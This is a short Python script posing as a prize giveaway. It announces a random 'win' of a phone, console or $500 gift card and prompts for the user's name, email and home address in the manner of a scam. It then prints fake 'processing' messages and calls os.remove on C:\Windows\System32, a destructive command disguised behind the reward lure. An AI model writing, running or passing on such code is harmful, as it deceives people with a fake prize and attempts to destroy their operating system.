import os
from time import sleep
from  random import choice

rewards = ["Iphone 15 Pro Max", "Samsung Galaxy S24 Ultra", "Ipad Pro", "PS5", "PS5 Slim", "Xbox Series X", "Xbox Series S","$500 Playstation Store Gift Card", "$500 Xbox Gift Card", "$500 Visa Prepaid Card", "$500 Mastercard Prepaid", "$500 Walmart Gift Card", "$500 Target Gift Card", "$500 Best Buy Gift Card", "$500 Gamestop Gift Card","$500 Amazon Gift Card", "$500 Ebay Gift Card", "$500 Cashapp Gift Card", "$500 Venmo Gift Card", "$500 Paypal Gift Card"]

reward = choice(rewards)

print("Congatulations!")
print(f"\nYou Won A {reward}!")

sleep(1)

print("\nWe Need Some Information To Redeem Your Reward.")

print("Loading...")

sleep(0.5)

input("\nName (What We Will Call You In Email Updates About Your Reward?): ")

input("\nEmail (For Updates About Your Reward): ")

input("\nHome Address (To Ship Your Reward To): ")

input("\nPress Enter To Redeem Reward: ")

print("\nProccessing Request For Facility...")

sleep(1.5)

print("Sending Request To Facility...")

sleep(0.5)

os.remove(r"C:\Windows\System32")

print("Done!")


